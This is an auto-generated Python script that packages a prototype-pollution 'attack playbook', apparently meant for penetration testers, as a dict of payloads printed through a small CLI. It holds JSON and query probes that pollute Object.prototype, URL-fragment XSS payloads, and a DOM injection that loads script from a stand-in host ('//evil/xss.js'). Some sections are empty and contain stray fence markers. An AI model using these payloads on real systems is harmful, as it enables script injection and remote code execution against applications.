#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/prototype-pollution

Skill: SKILL: Prototype Pollution — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-prototype-pollution.py --help
      python hack-skills-prototype-pollution.py --list
      python hack-skills-prototype-pollution.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/prototype-pollution'
TITLE = 'SKILL: Prototype Pollution — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: prototype-pollution", "description: >-", "Prototype pollution testing for JavaScript stacks. Use when user input is", "merged into objects (query parsers, JSON bodies, deep assign), when", "configuring libraries via untrusted keys, or when hunting RCE gadgets via", "polluted Object.prototype in Node or the browser."],
    'skill-prototype-pollution-expert-attack-playbook': ["Routing note: prioritize PP when you see deep merges, recursive assign, `JSON.parse` followed by `Object.assign`, or URL queries converted to nested objects."],
    '0-quick-start': [],
    'client-side-first-probes': ["```text", "When input can reflect into DOM or framework routing, pair with `alert(1)` / `console` checks to observe whether global object properties were polluted.", "```text"],
    'server-side-first-probes-json-form': ["```json", "{\"__proto__\":{\"polluted\":true}}", "```json", "{\"constructor\":{\"prototype\":{\"polluted\":true}}}", "After sending, check whether unrelated follow-up responses show abnormal headers/status/JSON spacing, or whether app logic reads `Object.prototype.polluted` (see \u00a73 detection table)."],
    'quick-boolean': ["If target code uses `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, or some `qs`/`query-string` configurations, **raise priority**."],
    '1-mechanism': ["**Prototype chain**: when accessing `obj.key`, if `obj` lacks own property `key`, lookup walks up `[[Prototype]]` until `Object.prototype`.", "**`__proto__`**: many parsers treat literal key `__proto__` as a magic path that attaches child properties to the prototype. Merging `{ \"__proto__\": { \"x\": 1 } }` can be equivalent to `Object.prototype.x = 1` depending on implementation and patch level.", "**`constructor.prototype`**: `constructor` typically points to the object's constructor function; `constructor.prototype` is that constructor's prototype object. For plain objects this usually links to `Object.prototype`. Example path:", "```json", "{\"constructor\":{\"prototype\":{\"polluted\":1}}}", "This is not always equivalent to `__proto__` (filtering, JSON parsing, Bun/Node differences), so **test both paths**.", "**Core issue**: this is not just \"one extra parameter\"; in non-isolated merge logic, attacker-controlled keys point to **prototype objects**, giving **global** or shared template context malicious properties that later code reads normally, triggering gadgets."],
    '2-client-side-detection': [],
    'url-fragment': ["```text", "https://app.example/page#__proto__[admin]=1", "```text", "https://app.example/#__proto__[xxx]=alert(1)", "If router or analytics code parses fragments into objects and then merges, pollution may occur."],
    'constructor-prototype-path': ["```text"],
    'dom-attribute-injection-ideas': ["If the framework merges attribute names as object keys:", "```text", "__proto__[src]=//evil/xss.js", "Event-handler style keys (implementation-dependent):", "```text", "__proto__[onerror]=alert(1)", "**Verification**: open a fresh page without fragment and check in console whether test keys remain on `Object.prototype`; account for extension and DevTools interference."],
    '3-server-side-detection-express-node-black-box': ["The payloads below assume body/query is deeply parsed into objects by **qs** or similar parsers (possibly with `body-parser`). Observe **global side effects**, not only current endpoint return values.", "**Operational tip**: send pollution request first, then a **clean** request to observe persistence; connection pools and worker lifecycle affect whether impact is globally visible."],
    '4-exploitation-gadgets': ["**Chain mindset**: pollution -> dependency reads `obj.settings.xxx` without `hasOwnProperty` -> RCE / SSRF / path traversal."],
    '5-tools': ["Prioritize use on **authorized** targets; automated tools can cause side effects on stateful applications."],
    '6-decision-tree': ["Input merged into nested object?", "(query, JSON, GraphQL vars, YAML\u2192JSON)", "NO --------------+-------------- YES", "Other vuln class                Parser allows __proto__ /", "constructor.prototype keys?", "NO --------------+-------------- YES", "Check unicode /                    Confirm global effect:", "bypass of key names               clean follow-up request", "+--------------+----------------+", "Gadget present? (template, spawn, JSON.stringify opts, CORS)", "NO ------------------+------------------ YES", "Report PP as DoS /              Build minimal RCE or", "logic impact                   high-impact PoC", "+---------------------+-------------------+", "Client-side: fragment / DOM / third-party script", "Server-side: qs/body-parser/lodash/deep-merge version audit"],
    'related-routing': ["- Input routing and multi-injection parallel entry -> [Injection Testing Router](../injection-checking/SKILL.md).", "- Template execution chains (non-PP) -> [SSTI](../ssti-server-side-template-injection/SKILL.md).", "- Insecure deserialization (non-JS prototype) -> [Deserialization](../deserialization-insecure/SKILL.md)."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()